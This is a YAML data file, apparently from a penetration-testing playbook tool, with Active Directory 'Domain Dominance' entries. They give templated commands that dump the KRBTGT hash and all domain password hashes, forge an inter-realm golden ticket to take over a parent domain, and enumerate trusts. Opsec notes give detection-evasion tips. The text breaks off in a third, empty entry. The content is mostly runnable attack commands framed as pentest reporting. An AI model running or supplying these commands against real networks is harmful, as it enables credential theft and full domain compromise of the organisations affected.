  - id: domain_persistence_full
    name: Domain Persistence — Full Documentation Checklist
    tab: Domain Dominance
    requires: [DC_IP, DOMAIN, USERNAME, PASSWORD]
    requires_priv: da
    tags: [dominance, persistence, reporting, documentation]
    description: >
      Post-compromise documentation and persistence demonstration.
      Run after achieving Domain Admin to document full impact.
    commands:
      - label: Confirm DA access
        cmd: "nxc smb {DC_IP} -u {USERNAME} -p '{PASSWORD}'"
      - label: Get domain SID
        cmd: "impacket-getPac -dc-ip {DC_IP} {DOMAIN}/{USERNAME}:'{PASSWORD}'"
      - label: Extract KRBTGT hash
        cmd: "impacket-secretsdump {DOMAIN}/{USERNAME}:'{PASSWORD}'@{DC_IP} -just-dc-user krbtgt"
      - label: Extract all domain hashes
        cmd: "impacket-secretsdump {DOMAIN}/{USERNAME}:'{PASSWORD}'@{DC_IP} -just-dc-ntlm -outputfile /tmp/all_domain_hashes"
      - label: Extract domain SID
        cmd: "impacket-lookupsid {DOMAIN}/{USERNAME}:'{PASSWORD}'@{DC_IP} | head -5"
      - label: Check Fine Grained Password Policies
        cmd: "nxc ldap {DC_IP} -u {USERNAME} -p '{PASSWORD}' --query '(objectClass=msDS-PasswordSettings)' 'cn msDS-MinimumPasswordLength msDS-PasswordHistoryLength'"
      - label: List all Domain Admin members
        cmd: "nxc ldap {DC_IP} -u {USERNAME} -p '{PASSWORD}' --query '(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local)' 'sAMAccountName'"
      - label: Enumerate trusts
        cmd: "nxc ldap {DC_IP} -u {USERNAME} -p '{PASSWORD}' --query '(objectClass=trustedDomain)' 'name trustType trustDirection'"
    next_steps:
      - "Document attack chain for report"
      - "Capture screenshots of all key steps"
      - "Begin cleanup verification"
      - "Rotate KRBTGT password recommendation"
    opsec: "DCSync generates 4662 with replication GUIDs — detectable by MDI. secretsdump with -use-vss is stealthier."

  - id: cross_trust_attack
    name: Cross-Forest / Cross-Domain Trust Attacks
    tab: Domain Dominance
    requires: [DC_IP, DOMAIN, USERNAME, PASSWORD, KRBTGT_HASH, DOMAIN_SID]
    requires_priv: da
    tags: [trust, cross-domain, forest, pivot, golden-ticket]
    description: Exploit domain trusts to pivot from a child domain to the forest root or across forest trusts.
    commands:
      - label: Enumerate trusts
        cmd: "impacket-GetDomainSID {DOMAIN}/{USERNAME}:'{PASSWORD}'@{DC_IP}"
      - label: Get child domain SID for inter-domain TGT
        cmd: "impacket-lookupSID {DOMAIN}/{USERNAME}:'{PASSWORD}'@{DC_IP} | grep 'S-1-5-21'"
      - label: Forge inter-realm TGT (child to parent)
        cmd: "impacket-ticketer -nthash {KRBTGT_HASH} -domain-sid {DOMAIN_SID} -domain {DOMAIN} -extra-sid S-1-5-21-<PARENT_DOMAIN_SID>-519 administrator"
      - label: Use forged ticket to access parent domain DC
        cmd: "export KRB5CCNAME=./administrator.ccache && impacket-secretsdump -k -no-pass {PARENT_DOMAIN}/administrator@{PARENT_DC_IP}"
      - label: Enumerate forest trusts
        cmd: "nxc ldap {DC_IP} -u {USERNAME} -p '{PASSWORD}' --query '(objectClass=trustedDomain)' 'name trustType trustDirection trustAttributes'"
    next_steps:
      - "Verify access to parent domain"
      - "Extract KRBTGT from parent domain for full forest compromise"
    opsec: "Cross-domain TGT forgery with SID history generates 4768 events with anomalous SIDs — detectable by MDI."

  - id: ad_recon_report
    name: Final — Post-Compromise Recon for Report
    tab: Domain Dominance
    requires: [DC_IP, DOMAIN, USERNAME, PASSWORD]
    requires_priv: da
    tags: [recon, reporting, documentation, final]
    description: Final data collection for the pentest report. Gather evidence of full domain compromise.
    commands:
